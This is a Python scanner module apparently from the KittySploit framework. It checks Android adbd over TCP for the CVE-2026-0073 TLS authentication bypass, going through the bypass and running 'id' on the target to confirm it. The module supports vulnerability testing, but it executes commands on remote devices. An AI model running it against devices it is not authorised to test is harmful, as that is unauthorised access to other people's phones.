#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Android adbd STLS/TLS auth bypass CVE-2026-0073."""

import ssl

from kittysploit import *
from core.framework.option import OptPort
from lib.protocols.adb.adb_tls import (
    AdbAuthPathError,
    AdbError,
    AdbTlsAuthBypassClient,
)
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        "name": "Android adbd TLS auth bypass CVE-2026-0073 detection",
        "description": (
            "Checks Android adbd over TCP for the STLS/TLS authentication bypass path "
            "and confirms command execution with a harmless id probe."
        ),
        "author": "KittySploit Team",
        "severity": "critical",
        "cve": "CVE-2026-0073",
        "modules": [
            "exploits/android/adb/adbd_tls_auth_bypass_cve_2026_0073",
        ],
        "tags": ["scanner", "tcp", "android", "adb", "adbd", "auth-bypass"],
    }

    port = OptPort(5555, "Target adbd TCP port", True)
    timeout = OptPort(10, "Probe timeout in seconds", False, advanced=True)

    def run(self):
        host = self._host()
        if not host:
            return False

        client = AdbTlsAuthBypassClient(host, self._port(), self._timeout())
        try:
            client.authenticate()
            output = client.run_command("id").strip()
        except AdbAuthPathError as e:
            self.set_info(severity="low", reason=str(e))
            return False
        except (AdbError, OSError, TimeoutError, ConnectionError, ssl.SSLError) as e:
            self.set_info(severity="unknown", reason=str(e))
            return False
        except Exception as e:
            self.set_info(severity="unknown", reason=str(e))
            return False
        finally:
            client.close()

        if "uid=" not in output:
            self.set_info(
                severity="high",
                cve="CVE-2026-0073",
                reason="STLS/TLS bypass reached an ADB shell, but id output was not recognized",
            )
            return True

        self.set_info(
            severity="critical",
            cve="CVE-2026-0073",
            reason=f"ADB TLS auth bypass confirmed on {host}:{self._port()}",
            proof=output[:200],
        )
        return True
